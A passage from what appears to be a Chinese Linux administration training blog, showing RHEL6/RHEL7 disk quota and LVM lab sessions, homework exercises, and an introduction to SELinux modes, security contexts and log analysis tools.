class="line">[root@rhel6 skel]# quotacheck -cugm /home/student</span><br><span class="line">[root@rhel6 skel]# ll /home/student</span><br><span class="line">total 32</span><br><span class="line">-rw-------. 1 root    root     6144 Jul  1 16:03 aquota.group</span><br><span class="line">-rw-------. 1 root    root     6144 Jul  1 16:03 aquota.user</span><br><span class="line">drwx------. 2 student student 16384 Jul  1 15:56 lost+found</span><br><span class="line">[root@rhel6 skel]# quotaon /home/student</span><br><span class="line">[root@rhel6 skel]# repquota /home/student</span><br><span class="line">*** Report for user quotas on device /dev/vdb2</span><br><span class="line">Block grace time: 7days; Inode grace time: 7days</span><br><span class="line">                        Block limits                File limits</span><br><span class="line">User            used    soft    hard  grace    used  soft  hard  grace</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">student   --      48       0       0              9     0     0       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 skel]# edquota student</span><br><span class="line">edquota: WARNING - /dev/vdb2: cannot change current inode allocation</span><br><span class="line">[root@rhel6 skel]# edquota student</span><br><span class="line">[root@rhel6 skel]# repquota /home/student</span><br><span class="line">*** Report for user quotas on device /dev/vdb2</span><br><span class="line">Block grace time: 7days; Inode grace time: 7days</span><br><span class="line">                        Block limits                File limits</span><br><span class="line">User            used    soft    hard  grace    used  soft  hard  grace</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">student   -+      48    3072    6144              9     3     6  7days</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 skel]# quota student</span><br><span class="line">Disk quotas for user student (uid 500):</span><br><span class="line">     Filesystem  blocks   quota   limit   grace   files   quota   limit   grace</span><br><span class="line">      /dev/vdb2      48    3072    6144               9*      3       6   7days</span><br><span class="line">[root@rhel6 skel]# su - student</span><br><span class="line">[student@rhel6 ~]$ touch file&#123;1..10&#125;</span><br><span class="line">vdb2: write failed, user file limit reached.</span><br><span class="line">touch: cannot touch `file1': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file2': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file3': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file4': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file5': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file6': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file7': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file8': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file9': Disk quota exceeded</span><br><span class="line">touch: cannot touch `file10': Disk quota exceeded</span><br></pre></td></tr></table></figure>

<h4 id="rhel7-quota实验"><a href="#rhel7-quota实验" class="headerlink" title="rhel7 quota实验"></a>rhel7 quota实验</h4><p>root用户：</p>
<ol>
<li><p>查看内核是否支持 quota 功能: dmesg | grep quota</p>
</li>
<li><p>查看 quota 程序包是否已经安装: rpm -q quota</p>
</li>
<li><p>查看 boot 目录是否支持 quota 功能(noquota 表示暂时不支持): mount|grep boot</p>
</li>
<li><p>让/boot 目录支持 quota 功能: vim /etc/fstab 属性中添加usrquota</p>
</li>
<li><p>重启主机后即可生效: reboot</p>
</li>
<li><p>查看 boot 目录是否支持 quota 功能(usrquota 表示已经支持): mount|grep boot</p>
</li>
<li><p>创建一个用于 quota 实验的用户 tom: useradd tom &amp;&amp; echo uplooking|passwd tom</p>
</li>
<li><p>需要允许其他用户对/boot 目录写入文件操作: chmod -Rf o+w /boot</p>
</li>
<li><p>使用 xfs_quota 命令设置对 tom 用户在/boot 目录的磁盘配额,具体要求如下:<br>使用 quota 专家模式限制磁盘软限制为 3m、磁盘硬限制为 6m、文件软限制为 3 个且文件硬限制为 6 个。 获取当前/boot 目录上的 quota 配额限制</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xfs_quota -x -c 'limit bsoft=3m bhard=6m isoft=3 ihard=6 tom' /boot</span><br><span class="line">xfs_quota -x -c report /boot</span><br></pre></td></tr></table></figure>
<p>切换至 tom 用户: su - tom</p>
</li>
<li><p>正常创建了一个为 5M 的文件: dd if=/dev/zero of=/boot/tom bs=5M count=1</p>
</li>
<li><p>创建 8M 文件时强制终止并报错了: dd if=/dev/zero of=/boot/tom bs=8M count=1</p>
</li>
<li><p>查看当前用户的 quota 限制(显示硬盘配额已占满): quota</p>
</li>
</ol>
<p>切换至root用户：exit</p>
<ol>
<li>编辑 tom 的配额限制,将硬盘的硬限制修改为 8m(8192k): edquota -u tom</li>
</ol>
<p>切换至 tom 用户: su - tom</p>
<ol>
<li>再来创建 8m 的文件就不会有问题了: dd if=/dev/zero of=/boot/tom bs=8M count=1</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# dmesg|grep quota</span><br><span class="line">[    0.836809] VFS: Disk quotas dquot_6.5.2</span><br><span class="line">[root@rhel7 ~]# rpm -q quota</span><br><span class="line">quota-4.01-11.el7.x86_64</span><br><span class="line">[root@rhel7 ~]# mount|grep boot</span><br><span class="line">/dev/vda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,noquota)</span><br><span class="line">[root@rhel7 ~]# vim /etc/fstab</span><br><span class="line">UUID=abbadca9-0a0d-453f-b713-d3d978cd6909 /boot                   xfs     defaults,usrquota        1 2</span><br><span class="line">[root@rhel7 ~]# reboot</span><br><span class="line">[root@rhel7 ~]# mount|grep boot</span><br><span class="line">/dev/vda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,usrquota)</span><br><span class="line">[root@rhel7 ~]# useradd tom</span><br><span class="line">[root@rhel7 ~]# passwd tom</span><br><span class="line">Changing password for user tom.</span><br><span class="line">New password:</span><br><span class="line">BAD PASSWORD: The password fails the dictionary check - it is based on a dictionary word</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line">[root@rhel7 ~]# chmod -Rf o+w /boot</span><br><span class="line">[root@rhel7 ~]# ll -d /boot</span><br><span class="line">dr-xr-xrwx. 3 root root 4096 Jun 27 03:59 /boot</span><br><span class="line">[root@rhel7 ~]# xfs_quota -x -c 'limit bsoft=3m bhard=6m isoft=3 ihard=6 tom' /boot</span><br><span class="line">[root@rhel7 ~]# xfs_quota -x -c report /boot</span><br><span class="line">User quota on /boot (/dev/vda1)</span><br><span class="line">                               Blocks                     </span><br><span class="line">User ID          Used       Soft       Hard    Warn/Grace     </span><br><span class="line">---------- --------------------------------------------------</span><br><span class="line">root           120384          0          0     00 [--------]</span><br><span class="line">tom                 0       3072       6144     00 [--------]</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# su - tom</span><br><span class="line">Last login: Fri Jul  1 02:51:33 EDT 2016 on pts/0</span><br><span class="line">[tom@rhel7 ~]$ dd if=/dev/zero of=/boot/tom bs=5M count=1</span><br><span class="line">1+0 records in</span><br><span class="line">1+0 records out</span><br><span class="line">5242880 bytes (5.2 MB) copied, 0.0270144 s, 194 MB/s</span><br><span class="line">[tom@rhel7 ~]$ dd if=/dev/zero of=/boot/tom bs=8M count=1</span><br><span class="line">dd: error writing ‘/boot/tom’: Disk quota exceeded</span><br><span class="line">1+0 records in</span><br><span class="line">0+0 records out</span><br><span class="line">6291456 bytes (6.3 MB) copied, 0.218067 s, 28.9 MB/s</span><br><span class="line">[tom@rhel7 ~]$ quota</span><br><span class="line">Disk quotas for user tom (uid 1001):</span><br><span class="line">     Filesystem  blocks   quota   limit   grace   files   quota   limit   grace</span><br><span class="line">      /dev/vda1    6144*   3072    6144   6days       1       3       6  </span><br><span class="line">[tom@rhel7 ~]$ exit</span><br><span class="line">logout</span><br><span class="line">[root@rhel7 ~]# edquota -u tom</span><br><span class="line">Disk quotas for user tom (uid 1001):</span><br><span class="line">  Filesystem                   blocks       soft       hard     inodes     soft     hard</span><br><span class="line">  /dev/vda1                      8192       3072       8192          1        3        6</span><br><span class="line">[root@rhel7 ~]# xfs_quota -x -c report /boot</span><br><span class="line">User quota on /boot (/dev/vda1)</span><br><span class="line">                               Blocks                     </span><br><span class="line">User ID          Used       Soft       Hard    Warn/Grace     </span><br><span class="line">---------- --------------------------------------------------</span><br><span class="line">root           120384          0          0     00 [--------]</span><br><span class="line">tom              6144       3072       8192     00  [6 days]</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# su - tom</span><br><span class="line">Last login: Fri Jul  1 02:58:22 EDT 2016 on pts/0</span><br><span class="line">[tom@rhel7 ~]$ dd if=/dev/zero of=/boot/tom bs=8M count=1</span><br><span class="line">1+0 records in</span><br><span class="line">1+0 records out</span><br><span class="line">8388608 bytes (8.4 MB) copied, 0.267325 s, 31.4 MB/s</span><br><span class="line">[tom@rhel7 ~]$ exit</span><br><span class="line">logout</span><br></pre></td></tr></table></figure>

<h2 id="逻辑卷管理-LVM"><a href="#逻辑卷管理-LVM" class="headerlink" title="逻辑卷管理 LVM"></a>逻辑卷管理 LVM</h2><p>逻辑卷管理 (Logical Volume Manager)</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>当用户根据实际情况需要对分区增加、减小等调整时,经常会受到硬盘 “ 灵活性 ” 的限制,很不方便。</p>
<p>逻辑卷管理器则是在磁盘分区与文件系统之间添加的逻辑层,提供一个抽象的卷组,使得管理者可以忽略底层磁盘布局, 从而实现对分区的灵活动态调整,这毫不夸张,所以红帽 RHEL7 系统已经默认启用了 LVM(Logical Volume Manager) 机制。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="pic/00.png" alt="00"></p>
<p>将物理分区做成 pv ；将 pv 组合成 vg ；再从 vg 分出 lv 分区 –&gt;pv–&gt;vg–&gt;lv</p>
<ul>
<li>物理卷(PV,Physical Volume ): 整个硬盘设备或使用 fdisk 命令建立的硬盘分区。</li>
<li>卷组(VG,Volume Group ) :由一个或多个物理卷(PV)组成的整体</li>
<li>逻辑卷(LV,Logical Volume ):从卷组(VG)出切割出的空间来用于创建文件系统,大小由 PE 的个数决定。</li>
</ul>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><img src="pic/27.png" alt="27"><br><img src="pic/28.png" alt="28"><br><img src="pic/30.png" alt="30"><br><img src="pic/31.png" alt="31"></p>
<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p>实验：linear 目前用户的映射目标为linear型，线性型，/dev/vdb1 pv1 100M;/dev/vdb2 pv2 100M;/dev/vdb3 pv 3 100M—–&gt;myvg 300M—–&gt;lv1-linear 20M;lv2-linear 60M现在lv1-linear不够用了，需要拓展60M的空间，lv2-linear也不够用了，需要拓展30M的空间，如何做才能提高读写速度？</p>
<p><img src="pic/32.png" alt="32"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iscsi1-f15 ~]# dmsetup table|grep my</span><br><span class="line">myvg-lv1--linear: 0 40960 linear 252:21 2048</span><br><span class="line">myvg-lv1--linear: 40960 32768 linear 252:21 165888</span><br><span class="line">myvg-lv1--linear: 73728 90112 linear 252:22 2048</span><br><span class="line">myvg-lv2--linear: 0 122880 linear 252:21 43008</span><br><span class="line">myvg-lv2--linear: 122880 65536 linear 252:22 92160</span><br><span class="line">–------------------------------------------------------------------------</span><br><span class="line">[root@iscsi1-f15 ~]# dmsetup table|grep myvg</span><br><span class="line">myvg-lv1--linear: 0 73728 linear 252:25 2048</span><br><span class="line">myvg-lv1--linear: 73728 90112 linear 252:25 75776</span><br><span class="line">myvg-lv2--linear: 0 122880 linear 252:25 165888</span><br><span class="line">myvg-lv2--linear: 122880 65536 linear 252:25 288768</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iscsi1-f15 ~]# fdisk /dev/vdb ---&gt;vdb[123] 100M</span><br><span class="line">[root@iscsi1-f15 ~]# pvcreate /dev/vdb[123]</span><br><span class="line">[root@iscsi1-f15 ~]# vgcreate myvg /dev/vdb[123]</span><br><span class="line">[root@iscsi1-f15 ~]# lvcreate -L 20M myvg -n lv1-linear</span><br><span class="line">[root@iscsi1-f15 ~]# lvcreate -L 60M myvg -n lv2-linear</span><br><span class="line">[root@iscsi1-f15 ~]# mkfs.ext4 /dev/myvg/lv1-linear</span><br><span class="line">[root@iscsi1-f15 ~]# mkfs.ext4 /dev/myvg/lv2-linear</span><br><span class="line">[root@iscsi1-f15 ~]# mount /dev/myvg/lv1-linear /opt/lv1</span><br><span class="line">[root@iscsi1-f15 ~]# mount /dev/myvg/lv2-linear /opt/lv2</span><br><span class="line">[root@iscsi1-f15 ~]# lvextend -L +60M /dev/myvg/lv1-linear</span><br><span class="line">[root@iscsi1-f15 ~]# lvextend -L +30M /dev/myvg/lv2-linear</span><br><span class="line">[root@iscsi1-f15 ~]# resize2fs /dev/myvg/lv1-linear</span><br><span class="line">[root@iscsi1-f15 ~]# resize2fs /dev/myvg/lv2-linear</span><br><span class="line">[root@iscsi1-f15 ~]# dmsetup table|grep my</span><br><span class="line">myvg-lv1--linear: 0 40960 linear 252:21 2048</span><br><span class="line">myvg-lv1--linear: 40960 32768 linear 252:21 165888</span><br><span class="line">myvg-lv1--linear: 73728 90112 linear 252:22 2048</span><br><span class="line">myvg-lv2--linear: 0 122880 linear 252:21 43008</span><br><span class="line">myvg-lv2--linear: 122880 65536 linear 252:22 92160</span><br><span class="line">–------------------------------------------------------------------------</span><br><span class="line">[root@iscsi1-f15 ~]# fdisk /dev/vdb ---&gt;vdb4 500M vdb5 500M</span><br><span class="line">[root@iscsi1-f15 ~]# partx -a /dev/vdb</span><br><span class="line">[root@iscsi1-f15 ~]# pvcreate /dev/vdb[45]</span><br><span class="line">[root@iscsi1-f15 ~]# vgextend myvg /dev/vdb[45]</span><br><span class="line">[root@iscsi1-f15 ~]# pvmove /dev/vdb1 /dev/vdb4</span><br><span class="line">[root@iscsi1-f15 ~]# pvmove /dev/vdb2 /dev/vdb4</span><br><span class="line">[root@iscsi1-f15 ~]# pvmove /dev/vdb4 /dev/vdb5</span><br><span class="line">[root@iscsi1-f15 ~]# dmsetup table|grep myvg</span><br><span class="line">myvg-lv1--linear: 0 73728 linear 252:25 2048</span><br><span class="line">myvg-lv1--linear: 73728 90112 linear 252:25 75776</span><br><span class="line">myvg-lv2--linear: 0 122880 linear 252:25 165888</span><br><span class="line">myvg-lv2--linear: 122880 65536 linear 252:25 288768</span><br></pre></td></tr></table></figure>


<h2 id="Linux文件系统和磁盘管理作业"><a href="#Linux文件系统和磁盘管理作业" class="headerlink" title="Linux文件系统和磁盘管理作业"></a>Linux文件系统和磁盘管理作业</h2><ol>
<li>分别在rhel6和rhel7上划分/dev/vdb磁盘，要求，/dev/vdb1大小为1G，/dev/vdb2大小为2G；创建对应操作系统默认的文件系统，rhel6默认ext4，rhel7默认xfs。</li>
<li>rhel6上将/dev/vdb2挂载在student家目录下使用，限制磁盘软限制为 3M、磁盘硬限制为 6M、文件软限制为 20 个且文件硬限制为 30 个</li>
<li>rhel7上完成：<br>root用户：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> 1. 查看内核是否支持 quota 功能:</span><br><span class="line"> 2. 查看 quota 程序包是否已经安装:</span><br><span class="line"> 3. 查看 boot 目录是否支持 quota 功能(noquota 表示暂时不支持):</span><br><span class="line"> 4. 让/boot 目录支持 quota 功能:</span><br><span class="line"> 5. 重启主机后即可生效:</span><br><span class="line"> 6. 查看 boot 目录是否支持 quota 功能(usrquota 表示已经支持):</span><br><span class="line"> 7. 创建一个用于 quota 实验的用户 tom:</span><br><span class="line"> 8. 需要允许其他用户对/boot 目录写入文件操作:</span><br><span class="line"> 9. 使用 xfs_quota 命令设置对 tom 用户在/boot 目录的磁盘配额,具体要求如下:</span><br><span class="line">使用 quota 专家模式限制磁盘软限制为 3m、磁盘硬限制为 6m、文件软限制为 3 个且文件硬限制为 6 个。 获取当前/boot 目录上的 quota 配额限制</span><br></pre></td></tr></table></figure>
切换至 tom 用户:<ol>
<li>正常创建了一个为 5M 的文件:</li>
<li>创建 8M 文件时强制终止并报错了:</li>
<li>查看当前用户的 quota 限制(显示硬盘配额已占满):</li>
</ol>
</li>
</ol>
<p>切换至root用户：</p>
<ol>
<li>编辑 tom 的配额限制,将硬盘的硬限制修改为 8m(8192k):</li>
</ol>
<p>切换至 tom 用户:</p>
<ol>
<li>再来创建 8m 的文件就不会有问题了:</li>
</ol>
<hr>
<ol start="4">
<li>rhel6和rhel7上完成lvm逻辑卷管理，要求：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1）/dev/vdb1 100M;/dev/vdb2 100M;/dev/vdb3 100M;/dev/vdb4 100M</span><br><span class="line">2) 将/dev/vdb[1,2,3,4]做成pv</span><br><span class="line">3）/dev/vdb1,/dev/vdb2组成vgtest300M</span><br><span class="line">4）从vgtest中划分50M的lvtest1</span><br><span class="line">5）将lvtest1挂载到/mnt下使用</span><br><span class="line">6）拓展lvtest1至200M</span><br><span class="line">7）拓展lvtest1至400M</span><br><span class="line">8）缩小lvtest1至50M</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux SELINUX</title>
    <url>/2016/12/22/booboo_linux_base/12-SELINUX/</url>
    <content><![CDATA[<h2 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h2><p>Security Enhanced Linux 安全强化的 Linux</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>强制限制某些操作 , 属于权限的一种</p>
<p>思考 : 到目前为止学过的 linux 中的权限 ?</p>
<p>u\g\o r\w\x ssid\sgid\stid acl attr</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>/etc/selinux/config</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">15<span class="comment">#root@rhel6 ~]#ll /etc/selinux/config</span></span></span><br><span class="line">-rw-r--r--. 1 root root 458 Jul 2 2015 /etc/selinux/config</span><br><span class="line"><span class="meta">[#</span><span class="bash">16<span class="comment">#root@rhel6 ~]#ll /etc/sysconfig/selinux</span></span></span><br><span class="line">lrwxrwxrwx. 1 root root 17 Jul 2 2015 /etc/sysconfig/selinux -&gt; ../selinux/config</span><br><span class="line"><span class="meta">[#</span><span class="bash">17<span class="comment">#root@rhel6 ~]#cat /etc/selinux/config</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This file controls the state of SELinux on the system.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELINUX= can take one of these three values: 【三种状态】</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> enforcing - SELinux security policy is enforced. 【打开 selinux , 并强制限制】</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> permissive - SELinux prints warnings instead of enforcing. 【打开 selinux , 不限制操作 , 但会警</span></span><br><span class="line">告】</span><br><span class="line"><span class="meta">#</span><span class="bash"> disabled - No SELinux policy is loaded. 【关闭 selinux 】</span></span><br><span class="line">SELINUX=enforcing</span><br><span class="line"><span class="meta">#</span><span class="bash"> SELINUXTYPE= can take one of these two values: 【两种类型】</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> targeted - Targeted processes are protected, 【针对网络服务较多 , 针对主机较少】</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mls - Multi Level Security protection. 【全方位的控制】</span></span><br><span class="line">SELINUXTYPE=targeted</span><br></pre></td></tr></table></figure>

<p>重启电脑后生效 , 并永久生效</p>
<h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><ul>
<li>查看当前 selinux 状态的命令 : getenforce/sestatus</li>
<li>设置 selinux 状态 ( 临时生效 ): setenforce [ Enforcing | Permissive | 1 | 0 ]</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">12<span class="comment">#root@rhel6 ~]#getenforce</span></span></span><br><span class="line">Enforcing</span><br><span class="line"><span class="meta">[#</span><span class="bash">13<span class="comment">#root@rhel6 ~]#sestatus</span></span></span><br><span class="line">SELinux status:</span><br><span class="line">enabled</span><br><span class="line">SELinuxfs mount:</span><br><span class="line">/selinux</span><br><span class="line">Current mode:</span><br><span class="line">enforcing</span><br><span class="line">Mode from config file:</span><br><span class="line">enforcing</span><br><span class="line">Policy version:</span><br><span class="line">28</span><br><span class="line">Policy from config file:</span><br><span class="line">targeted</span><br><span class="line">[root@rhel7 ~]# setenforce 0</span><br><span class="line">[root@rhel7 ~]# getenforce</span><br><span class="line">Permissive</span><br><span class="line">[root@rhel7 ~]# sestatus</span><br><span class="line">SELinux status:</span><br><span class="line">enabled</span><br><span class="line">SELinuxfs mount:</span><br><span class="line">/sys/fs/selinux</span><br><span class="line">SELinux root directory:</span><br><span class="line">/etc/selinux</span><br><span class="line">Loaded policy name:</span><br><span class="line">targeted</span><br><span class="line">Current mode:</span><br><span class="line">permissive</span><br><span class="line">Mode from config file:</span><br><span class="line">enforcing</span><br><span class="line">Policy MLS status:</span><br><span class="line">enabled</span><br><span class="line">Policy deny_unknown status: allowed</span><br><span class="line">Max kernel policy version: 28</span><br><span class="line">[root@rhel7 ~]# which getenforce</span><br><span class="line">/usr/sbin/getenforce</span><br><span class="line">[root@rhel7 ~]# rpm -qf /usr/sbin/getenforce</span><br><span class="line">libselinux-utils-2.2.2-6.el7.x86_64</span><br><span class="line">[root@rhel7 ~]# rpm -ql libselinux-utils|head</span><br><span class="line">/usr/sbin/avcstat</span><br><span class="line">/usr/sbin/getenforce</span><br><span class="line">/usr/sbin/getsebool</span><br><span class="line">/usr/sbin/matchpathcon</span><br><span class="line">/usr/sbin/selinuxconlist</span><br><span class="line">/usr/sbin/selinuxdefcon</span><br><span class="line">/usr/sbin/selinuxenabled</span><br><span class="line">/usr/sbin/selinuxexeccon</span><br><span class="line">/usr/sbin/setenforce</span><br><span class="line">/usr/share/man/man5/booleans.5.gz</span><br><span class="line">[root@rhel7 ~]# which sestatus</span><br><span class="line">/usr/sbin/sestatus</span><br><span class="line">[root@rhel7 ~]# rpm -qf /usr/sbin/sestatuspolicycoreutils-2.2.5-11.el7.x86_64</span><br><span class="line">[root@rhel7 ~]# rpm -ql policycoreutils|head</span><br><span class="line">/etc/sestatus.conf</span><br><span class="line">/usr/bin/secon</span><br><span class="line">/usr/sbin/fixfiles</span><br><span class="line">/usr/sbin/genhomedircon</span><br><span class="line">/usr/sbin/load_policy</span><br><span class="line">/usr/sbin/restorecon</span><br><span class="line">/usr/sbin/semodule</span><br><span class="line">/usr/sbin/sestatus</span><br><span class="line">/usr/sbin/setfiles</span><br><span class="line">/usr/sbin/setsebool</span><br></pre></td></tr></table></figure>

<h3 id="操作限制的实现方法"><a href="#操作限制的实现方法" class="headerlink" title="操作限制的实现方法"></a>操作限制的实现方法</h3><ol>
<li>通过 bool 值来进行操作的限制</li>
</ol>
<ul>
<li>1&gt;getsebool -a &lt;== 显示主机中所有的布尔值</li>
<li>2&gt;setsebool [-PV] boolean value | bool1=val1 bool2=val2 …</li>
</ul>
<ol start="2">
<li>通过安全上下文<br>主体（进程）与目标的安全上下文必须一致才能够顺利访问<br>查看安全上下文<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">19<span class="comment">#root@rhel6 ~]#ls -Z</span></span></span><br><span class="line">-rw-------. root root system_u:object_r:admin_home_t:s0 anaconda-ks.cfg</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Desktop</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Documents</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Downloads</span><br><span class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 index.php3?stat=26</span><br><span class="line">-rw-r--r--. root root system_u:object_r:admin_home_t:s0 install.log</span><br><span class="line">-rw-r--r--. root root system_u:object_r:admin_home_t:s0 install.log.syslog</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Music</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Pictures</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Public</span><br><span class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 root@172.25.0.10</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Templates</span><br><span class="line">drwxr-xr-x. root root unconfined_u:object_r:admin_home_t:s0 Videos</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>安全上下文主要用冒号分为三个字段 :</p>
<p>Identify:role:type</p>
<p>身份识别 : 角色 : 类型1.5 selinux 所需要的服务</p>
<p>身份标识和角色并不重要，安全上下文里重要的就是这个类型，一个主体进程能不能读取到这个文件资源与类型字段有关。<br>之前我们说进程和文件的上下文的类型必须要匹配。这里涉及到两个专有名词，一个叫域，一个叫类型。其中主体程序中称为域，文件资源上称为类型，是不是有种听天书的感觉？很拗口吧？我们来举个列子。<br>先将httpd服务开启，service httpd start<br>Cd /var/www/html 这里是一个系列的网页文件，可以看到文件类型属于httpd_sys_content_t 还有httpd_sys_script_exec_t。<br>然后我们再看进程的上下文类型<br>先查看有没有这个进程  pstree | grep httpd<br>然后查看进程的安全上下文 ps aux -Z | grep http。<br>在这里Httpd是一个域，selinux的策略针对这个域制定了许多的规则，其中包括这个域可以读的目标资源类型，比如sys_content。<br>主题进程和目标的文件的安全上下文必须匹配不然会有权限报错的提示</p>
<p>修改安全上下文<br>使用chcon命令来更改安全上下文的类型</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@python tmp]# ls --context test.txt</span><br><span class="line">-rw-r--r-- root root root:object_r:staff_tmp_t test.txt</span><br><span class="line">[root@python tmp]# chcon -t etc_t test.txt</span><br><span class="line">[root@python tmp]# ls -lZ test.txt</span><br><span class="line">-rw-r--r-- root root root:object_r:etc_t test.txt</span><br></pre></td></tr></table></figure>

<p>###Selinux的日志分析工具sealert<br>setroubleshoot</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">40<span class="comment">#root@rhel6 ~]#yum install -y setroubleshoot     ===&gt;安装日志分析工具</span></span></span><br><span class="line"><span class="meta">[#</span><span class="bash">42<span class="comment">#root@rhel6 ~]#rpm -ql setroubleshoot-server|head</span></span></span><br><span class="line">/etc/audisp/plugins.d/sedispatch.conf</span><br><span class="line">/etc/dbus-1/system.d/org.fedoraproject.SetroubleshootFixit.conf</span><br><span class="line">/etc/dbus-1/system.d/org.fedoraproject.Setroubleshootd.conf</span><br><span class="line">/etc/logrotate.d/setroubleshoot</span><br><span class="line">/etc/setroubleshoot</span><br><span class="line">/etc/setroubleshoot/setroubleshoot.conf</span><br><span class="line">/usr/bin/sealert</span><br><span class="line"><span class="meta">[#</span><span class="bash">40<span class="comment">#root@rhel6 ~]#Sealert -a /var/log/audit/audit.log	===&gt;使用日志分析工具来分析selinux的日志</span></span></span><br><span class="line">等待数据处理，处理完毕之后查看</span><br></pre></td></tr></table></figure>

<p>setroubleshot 将 selinux 相关的错误信息和解决方法记录在 /var/log/messages 日志中。<code>cat /var/log/messages | grep setroubleshoot</code></p>
<h4 id="auditd"><a href="#auditd" class="headerlink" title="auditd"></a>auditd</h4><ul>
<li>auditd –&gt; 将 selinux 相关的信息记录在 /var/log/audit/audit.log 日志中,非常详细。</li>
<li>sealert -a /var/log/audit/audit.log</li>
</ul>
<h3 id="selinux-policy-devel"><a href="#selinux-policy-devel" class="headerlink" title="selinux-policy-devel"></a>selinux-policy-devel</h3><p>el6 上没有该软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# yum list|grep selinux-policy-devel</span><br><span class="line">selinux-policy-devel.noarch 3.12.1-153.el7 server</span><br><span class="line"></span><br><span class="line"><span class="meta">[#</span><span class="bash">64<span class="comment">#root@rhel6 ~]#yum list|grep selinux-policy-devel</span></span></span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager</span><br><span class="line">to register.</span><br></pre></td></tr></table></figure>
<p><code>man</code> 关键词 <code>_selinux</code> 查找和关键字相关的 <code>selinux</code> 限制具体内容 , 包括什么打开什么布尔值 , 需要设置怎样的安全上下文。</p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 内核</title>
    <url>/2016/12/22/booboo_linux_base/11-Linux%E5%86%85%E6%A0%B8/</url>
    <content><![CDATA[<h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>内核与内核模块在哪里呢?内核模块都有哪些呢?下面的表中都列出来了:</p>
<ul>
<li>内核 /boot/vmlinuz-version</li>
<li>内核解压缩所需 RAM Disk /boot/initrd-version</li>
<li>内核模块 /lib/modules/$(uname -r)/kernel</li>
</ul>
<h3 id="WHAT"><a href="#WHAT" class="headerlink" title="WHAT"></a>WHAT</h3><p>开机时,内核第一任务就是驱动硬件,激活机器。相关的驱动模块放在 <code>/lib/modules/$(uname -r)/</code> 目录下,下面以 rhel6 为例,看看该目录下都有些什么:</p>
